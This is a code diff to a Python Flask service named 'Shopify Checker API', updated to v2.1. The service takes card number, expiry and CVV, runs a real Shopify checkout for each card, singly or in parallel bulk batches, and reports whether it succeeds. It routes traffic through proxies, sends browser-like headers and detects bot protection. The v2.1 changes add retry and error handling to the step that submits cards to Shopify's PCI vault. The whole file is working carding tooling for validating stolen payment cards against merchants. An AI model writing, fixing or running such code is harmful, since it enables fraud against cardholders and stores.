@@ -1,30 +1,11 @@
 """
-Shopify Checker API — High-Performance Build (v2, corrected)
+Shopify Checker API — High-Performance Build (v2.1, corrected)
 ==============================================================
-What this actually does:
-  • Real Shopify Checkout Web protocol via /checkouts/unstable/graphql
-  • Real card vaulting via checkout.pci.shopifyinc.com/sessions
-  • Proper receipt polling
-  • Threadpool-bounded async execution
-  • Bulk endpoint for parallel checks
-
-What changed vs the previous version:
-  1.  /health reads _active_tasks under lock — no more race
-  2.  Bounded queue — /shopify returns 503 when workers + queue are full
-  3.  /shopify_bulk cancels + drains unfinished futures on timeout
-  4.  _active_tasks now counts both /shopify AND /shopify_bulk
-  5.  Overall per-card timeout via asyncio.wait_for(HARD_TIMEOUT)
-  6.  pick_addr(url, currency) — tries currency first if TLD unknown
-  7.  extract_clean tightened — filters out URL fragments and hash noise
-  8.  _session_token regex rejects 32+ hex strings (hashes) that aren't tokens
-  9.  is_captcha catches PerimeterX / Akamai / DataDome
-  10. parse_cc strips whitespace inside each part
-
-Run:
-  pip install -r requirements.txt
-  python shopify_checker.py
-or production:
-  gunicorn -w 1 -k gevent --threads 128 shopify_checker:app
+Fixes in v2.1:
+  • Vault response guard — check status + content-type + non-empty before json.loads
+  • Vault retry — one extra attempt on non-JSON / empty responses
+  • Specific vault error codes — vault_empty, vault_html, vault_status_XXX, vault_no_id
+  • All prior v2 fixes retained (bounded queue, hard timeout, single-fire proposal)
 """
 
 import asyncio
@@ -47,13 +28,13 @@ logger = logging.getLogger(__name__)
 
 # ── Tunables ──────────────────────────────────────────────────────────────────
 MAX_WORKERS       = int(os.getenv("MAX_WORKERS", "30"))
-QUEUE_CAPACITY    = int(os.getenv("QUEUE_CAPACITY", "120"))   # max queued above running
+QUEUE_CAPACITY    = int(os.getenv("QUEUE_CAPACITY", "120"))
 CONN_TIMEOUT      = int(os.getenv("CONN_TIMEOUT", "8"))
 READ_TIMEOUT      = int(os.getenv("READ_TIMEOUT", "15"))
 POLL_INITIAL      = float(os.getenv("POLL_INITIAL", "1"))
 POLL_INTERVAL     = float(os.getenv("POLL_INTERVAL", "2"))
 POLL_MAX          = int(os.getenv("POLL_MAX", "4"))
-HARD_TIMEOUT      = int(os.getenv("HARD_TIMEOUT", "90"))      # seconds per full card check
+HARD_TIMEOUT      = int(os.getenv("HARD_TIMEOUT", "90"))
 
 # ── Shared executor & counters ───────────────────────────────────────────────
 _executor      = ThreadPoolExecutor(max_workers=MAX_WORKERS, thread_name_prefix="card")
@@ -61,7 +42,8 @@ _active_tasks  = 0
 _queued_tasks  = 0
 _task_lock     = threading.Lock()
 
-# ── GraphQL queries (unchanged — real Checkout Web protocol) ─────────────────
+
+# ── GraphQL queries (real Checkout Web protocol) ─────────────────────────────
 QUERY_PROPOSAL_SHIPPING = (
     "query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
     "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
@@ -180,13 +162,12 @@ QUERY_POLL = (
     "...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"
 )
 
-# Sanity check — reject truncated queries at import time
 if len(QUERY_PROPOSAL_SHIPPING) < 500:
-    raise RuntimeError(f"QUERY_PROPOSAL_SHIPPING looks truncated ({len(QUERY_PROPOSAL_SHIPPING)} chars)")
+    raise RuntimeError(f"QUERY_PROPOSAL_SHIPPING truncated ({len(QUERY_PROPOSAL_SHIPPING)} chars)")
 if len(MUTATION_SUBMIT) < 500:
-    raise RuntimeError(f"MUTATION_SUBMIT looks truncated ({len(MUTATION_SUBMIT)} chars)")
+    raise RuntimeError(f"MUTATION_SUBMIT truncated ({len(MUTATION_SUBMIT)} chars)")
 if len(QUERY_POLL) < 400:
-    raise RuntimeError(f"QUERY_POLL looks truncated ({len(QUERY_POLL)} chars)")
+    raise RuntimeError(f"QUERY_POLL truncated ({len(QUERY_POLL)} chars)")
 
 
 # ── Address book ──────────────────────────────────────────────────────────────
@@ -221,7 +202,6 @@ BOOK = {
 
 
 def pick_addr(url, currency=None):
-    """Try TLD first, then fall back to currency → country mapping."""
     try:
         tld = urlparse(url).netloc.split('.')[-1].upper()
         if tld in BOOK:
@@ -296,17 +276,14 @@ def _eb(text, start, end):
         return None
 
 
-# Legitimate card error codes — must be ALL CAPS and 4–64 chars with at least one underscore
 _CARD_ERR_RE = re.compile(r'\b([A-Z][A-Z0-9]{2,}(?:_[A-Z0-9]{2,}){1,7})\b')
 
 
 def extract_clean(msg):
-    """Extract the most meaningful error code from any string."""
     if not msg:
         return "UNKNOWN_ERROR"
     msg = str(msg)
 
-    # Explicit JSON code
     for pat in [r'"code"\s*:\s*"([^"]+)"', r"'code'\s*:\s*'([^']+)'"]:
         m = re.search(pat, msg)
         if m:
@@ -314,16 +291,14 @@ def extract_clean(msg):
             if c and len(c) < 64 and re.fullmatch(r'[A-Z0-9_]+', c):
                 return c
 
-    # Named card errors
-    for pat in (r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'(CHECKOUT_[A-Z_]+)'):
+    for pat in (r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'(CHECKOUT_[A-Z_]+)',
+                r'(VAULT_[A-Z_]+)'):
         m = re.search(pat, msg)
         if m:
             return m.group(1)
 
-    # Generic SCREAMING_SNAKE codes
     for m in _CARD_ERR_RE.finditer(msg):
         s = m.group(1)
-        # filter out HTTP methods, common English, URL pieces
         if s in ("HTTP", "HTTPS", "API", "ID", "UUID", "JSON"):
             continue
         if "_" not in s:
@@ -336,7 +311,7 @@ def extract_clean(msg):
 CAPTCHA_MARKERS = (
     "CAPTCHA_REQUIRED", "CAPTCHA CHALLENGE", "HCAPTCHA", "H-CAPTCHA",
     "RECAPTCHA", "G-RECAPTCHA", "PERIMETERX", "PX_BLOCK", "AKAMAI_BLOCK",
-    "DATADOME", "CF-CHALLENGE",
+    "DATADOME", "CF-CHALLENGE", "JUST A MOMENT",
 )
 
 
@@ -371,18 +346,16 @@ async def _gql(session, url, params, headers, body, proxy):
         return None, str(e)[:100]
 
 
-_HASH_RE = re.compile(r'^[a-f0-9]{32,}$')  # rejects MD5/SHA-looking junk
+_HASH_RE = re.compile(r'^[a-f0-9]{32,}$')
 
 
 async def _session_token(response_obj, text, unesc, checkout_url):
-    # 1. Header
     for hdr in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token",
                 "X-Shopify-Checkout-Session-Token", "shopify-checkout-session-token"):
         v = response_obj.headers.get(hdr, "")
         if v and len(v) > 10:
             return v.strip()
 
-    # 2. Body patterns
     for src in (text, unesc):
         for pat in [
             r'"serializedSessionToken"\s*:\s*"([^"]{20,})"',
@@ -400,7 +373,6 @@ async def _session_token(response_obj, text, unesc, checkout_url):
                 if len(tok) >= 20 and not _HASH_RE.match(tok):
                     return tok
 
-    # 3. Extract from URL
     m = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9_\-]{20,})', checkout_url)
     if m and not m.group(1).isdigit():
         return m.group(1)
@@ -444,7 +416,110 @@ async def _fetch_products(domain, proxy):
         return None, str(e)[:80]
 
 
-async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+async def _vault_card(session, cc, mes, ano, cvv, fn, ln, ourl, ident_sig, ua, proxy, debug):
+    """
+    Post card to PCI vault. Returns (token, err_code).
+    Handles non-JSON responses robustly with one retry.
+    """
+    vault_hdrs = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://checkout.pci.shopifyinc.com",
+        "Referer": "https://checkout.pci.shopifyinc.com/",
+        "User-Agent": ua,
+        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin", "sec-fetch-storage-access": "active",
+    }
+    if ident_sig:
+        vault_hdrs["shopify-identification-signature"] = ident_sig
+
+    body = json.dumps({
+        "credit_card": {
+            "number": cc, "month": int(mes), "year": int(ano),
+            "verification_value": cvv,
+            "start_month": None, "start_year": None,
+            "issue_number": "", "name": f"{fn} {ln}",
+        },
+        "payment_session_scope": urlparse(ourl).netloc,
+    }, ensure_ascii=False).encode("utf-8")
+
+    last_err = "vault_unknown"
+
+    for attempt in range(2):
+        try:
+            async with session.post("https://checkout.pci.shopifyinc.com/sessions",
+                                    data=body, headers=vault_hdrs, proxy=proxy) as vr:
+                status = vr.status
+                ctype  = vr.headers.get("Content-Type", "").lower()
+                text   = await vr.text()
+        except asyncio.TimeoutError:
+            last_err = "vault_timeout"
+            if debug:
+                logger.warning(f"vault attempt {attempt+1}: timeout")
+            continue
+        except Exception as e:
+            last_err = f"vault_net: {type(e).__name__}"
+            if debug:
+                logger.warning(f"vault attempt {attempt+1}: {last_err}")
+            continue
+
+        if status != 200:
+            last_err = f"vault_status_{status}"
+            if debug:
+                logger.warning(f"vault attempt {attempt+1}: HTTP {status}, body={text[:120]}")
+            continue
+
+        if not text or not text.strip():
+            last_err = "vault_empty"
+            if debug:
+                logger.warning(f"vault attempt {attempt+1}: empty body")
+            continue
+
+        text_s = text.strip()
+
+        # HTML challenge or error page
+        if text_s.startswith("<") or "text/html" in ctype:
+            last_err = "vault_html"
+            if debug:
+                logger.warning(f"vault attempt {attempt+1}: html body: {text_s[:120]}")
+            continue
+
+        # Try JSON
+        try:
+            vj = json.loads(text_s)
+        except json.JSONDecodeError as e:
+            last_err = "vault_parse"
+            if debug:
+                logger.warning(f"vault attempt {attempt+1}: parse err: {e}, body={text_s[:120]}")
+            continue
+
+        if not isinstance(vj, dict):
+            last_err = "vault_nondict"
+            if debug:
+                logger.warning(f"vault attempt {attempt+1}: non-dict: {type(vj).__name__}")
+            continue
+
+        token = vj.get("id")
+        if token:
+            return token, None
+
+        # JSON but no id — usually an error payload
+        err_obj = vj.get("error") or {}
+        if isinstance(err_obj, dict):
+            last_err = err_obj.get("code") or err_obj.get("message") or "vault_no_id"
+        else:
+            last_err = "vault_no_id"
+        if debug:
+            logger.warning(f"vault attempt {attempt+1}: no id, body={text_s[:150]}")
+        # No point retrying a valid JSON error response
+        return None, last_err
+
+    return None, last_err
+
+
+async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None,
+                             proxy_str=None, debug=False):
     gateway, price, currency = "UNKNOWN", "0.00", "USD"
 
     ourl  = site_url if site_url.startswith("http") else f"https://{site_url}"
@@ -458,9 +533,10 @@ async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy
     conn = aiohttp.TCPConnector(ssl=False, limit=200, limit_per_host=20)
 
     try:
+        ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+              "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
         hdrs = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
-                          "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+            "User-Agent": ua,
             "Accept": "application/json, text/plain, */*",
             "Accept-Language": "en-US,en;q=0.9",
             "Content-Type": "application/json",
@@ -476,7 +552,7 @@ async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy
 
         async with aiohttp.ClientSession(connector=conn, timeout=to) as session:
 
-            # ── variant resolution ─────────────────────────────────────
+            # ── variant ────────────────────────────────────────────────
             if not variant_id:
                 info, err = await _fetch_products(ourl, proxy)
                 if err:
@@ -501,7 +577,7 @@ async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy
             except Exception as e:
                 return False, f"cart_error: {str(e)[:60]}", gateway, price, currency
 
-            # ── checkout redirect ──────────────────────────────────────
+            # ── checkout ───────────────────────────────────────────────
             chk_hdrs = {**hdrs,
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
@@ -654,7 +730,6 @@ async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy
                 "optionalDuties": {"buyerRefusesDuties": False},
             }
 
-            # ── proposal (single fire) ─────────────────────────────────
             body1 = {"query": QUERY_PROPOSAL_SHIPPING, "operationName": "Proposal",
                      "variables": proposal_vars}
             t1, err1 = await _gql(session, gql_url, gql_p, hdrs, body1, proxy)
@@ -666,7 +741,6 @@ async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy
             r1, e1 = safe_parse(t1, "proposal_shipping")
             if e1:
                 return False, e1, gateway, price, currency
-
             if r1.get("errors"):
                 msgs = [e.get("message", "") for e in r1["errors"][:2]]
                 return False, f"gql_error: {'; '.join(msgs)[:120]}", gateway, price, currency
@@ -776,41 +850,13 @@ async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy
                                                   pm.get("name") or pid).strip()
                                     break
 
-            # ── vault card ─────────────────────────────────────────────
-            vault_hdrs = {
-                "Content-Type": "application/json", "Accept": "application/json",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Origin": "https://checkout.pci.shopifyinc.com",
-                "Referer": "https://checkout.pci.shopifyinc.com/",
-                "User-Agent": hdrs["User-Agent"],
-                "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin", "sec-fetch-storage-access": "active",
-            }
-            if ident_sig:
-                vault_hdrs["shopify-identification-signature"] = ident_sig
-
-            vault_body = json.dumps({
-                "credit_card": {
-                    "number": cc, "month": int(mes), "year": int(ano),
-                    "verification_value": cvv,
-                    "start_month": None, "start_year": None,
-                    "issue_number": "", "name": f"{fn} {ln}",
-                },
-                "payment_session_scope": urlparse(ourl).netloc,
-            }, ensure_ascii=False).encode("utf-8")
-
-            try:
-                async with session.post("https://checkout.pci.shopifyinc.com/sessions",
-                                        data=vault_body, headers=vault_hdrs, proxy=proxy) as vr:
-                    vt = await vr.text()
-                vj, ve = safe_parse(vt, "vault")
-                if ve:
-                    return False, f"vault_parse: {ve}", gateway, price, currency
-                token = vj.get("id")
-                if not token:
-                    return False, f"no_vault_token: {str(vj)[:80]}", gateway, price, currency
-            except Exception as e:
-                return False, f"vault_error: {str(e)[:80]}", gateway, price, currency
+            # ── vault card (FIXED) ─────────────────────────────────────
+            token, vault_err = await _vault_card(
+                session, cc, mes, ano, cvv, fn, ln, ourl,
+                ident_sig, ua, proxy, debug,
+            )
+            if not token:
+                return False, vault_err or "vault_failed", gateway, price, currency
 
             # ── submit ─────────────────────────────────────────────────
             street_addr = {
@@ -1009,11 +1055,10 @@ async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy
         return False, f"exception: {str(e)[:120]}", gateway, price, currency
 
 
-async def _process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str):
-    """Wraps process_card_inner with an overall hard timeout."""
+async def _process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str, debug=False):
     try:
         return await asyncio.wait_for(
-            process_card_inner(cc, mes, ano, cvv, site, variant_id, proxy_str),
+            process_card_inner(cc, mes, ano, cvv, site, variant_id, proxy_str, debug),
             timeout=HARD_TIMEOUT,
         )
     except asyncio.TimeoutError:
@@ -1022,8 +1067,8 @@ async def _process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str):
         return False, f"bounded_exception: {str(e)[:100]}", "UNKNOWN", "0.00", "USD"
 
 
-def _run_card(cc, mes, ano, cvv, site, variant_id, proxy_str):
-    return asyncio.run(_process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str))
+def _run_card(cc, mes, ano, cvv, site, variant_id, proxy_str, debug=False):
+    return asyncio.run(_process_card_bounded(cc, mes, ano, cvv, site, variant_id, proxy_str, debug))
 
 
 def parse_cc(raw):
@@ -1033,13 +1078,11 @@ def parse_cc(raw):
     return parts[0], parts[1], parts[2], parts[3]
 
 
-# ── Concurrency gate ─────────────────────────────────────────────────────────
 class GateRejected(Exception):
     pass
 
 
 def _acquire():
-    """Try to reserve a slot. Raises GateRejected if queue is full."""
     global _active_tasks, _queued_tasks
     with _task_lock:
         if _queued_tasks >= QUEUE_CAPACITY:
@@ -1055,7 +1098,6 @@ def _release():
         _queued_tasks = max(0, _queued_tasks - 1)
 
 
-# ── Flask ────────────────────────────────────────────────────────────────────
 app = Flask(__name__)
 
 
@@ -1068,6 +1110,7 @@ def shopify_check():
     cc_raw    = (p.get("cc") or "").strip()
     proxy_str = (p.get("proxy") or "").strip() or None
     variant   = (p.get("variant") or "").strip() or None
+    debug     = (p.get("debug") or "").lower() in ("1", "true", "yes")
 
     if not site_raw:
         return jsonify({"error": "Missing 'site'", "status": False}), 400
@@ -1088,7 +1131,7 @@ def shopify_check():
 
     t0 = time.time()
     try:
-        future = _executor.submit(_run_card, cc, mes, ano, cvv, site, variant, proxy_str)
+        future = _executor.submit(_run_card, cc, mes, ano, cvv, site, variant, proxy_str, debug)
         success, message, gw, price, curr = future.result(timeout=HARD_TIMEOUT + 10)
     except Exception as e:
         return jsonify({
@@ -1144,12 +1187,11 @@ def shopify_bulk():
             except ValueError:
                 results[i] = {"cc": raw, "error": "bad_format", "Status": False}
                 continue
-            fut = _executor.submit(_run_card, cc, mes, ano, cvv, site, None, proxy)
+            fut = _executor.submit(_run_card, cc, mes, ano, cvv, site, None, proxy, False)
             futures[fut] = (i, raw)
 
         done, pending = wait(futures.keys(), timeout=HARD_TIMEOUT + 20)
 
-        # Handle completed
         for fut in done:
             i, raw = futures[fut]
             try:
@@ -1161,19 +1203,16 @@ def shopify_bulk():
             except Exception as e:
                 results[i] = {"cc": raw, "error": str(e)[:80], "Status": False}
 
-        # Cancel + drain unfinished
         for fut in pending:
             i, raw = futures[fut]
             fut.cancel()
             results[i] = {"cc": raw, "error": "timeout", "Status": False}
-        # Try to drain any that complete after cancel()
         for fut in pending:
             try:
                 fut.result(timeout=0)
             except Exception:
                 pass
 
-        # Fill anything still None
         for i, r in enumerate(results):
             if r is None:
                 results[i] = {"cc": cards[i], "error": "unknown", "Status": False}
@@ -1209,9 +1248,9 @@ def health():
 @app.route("/", methods=["GET"])
 def root():
     return jsonify({
-        "name": "Shopify Checker API v2",
+        "name": "Shopify Checker API v2.1",
         "endpoints": {
-            "check":  "GET/POST /shopify?cc=CC|MM|YYYY|CVV&site=example.com[&proxy=...]",
+            "check":  "GET/POST /shopify?cc=CC|MM|YYYY|CVV&site=example.com[&proxy=...][&debug=1]",
             "bulk":   "POST /shopify_bulk {cards:[...], site:..., proxy:...}",
             "health": "GET /health",
         },
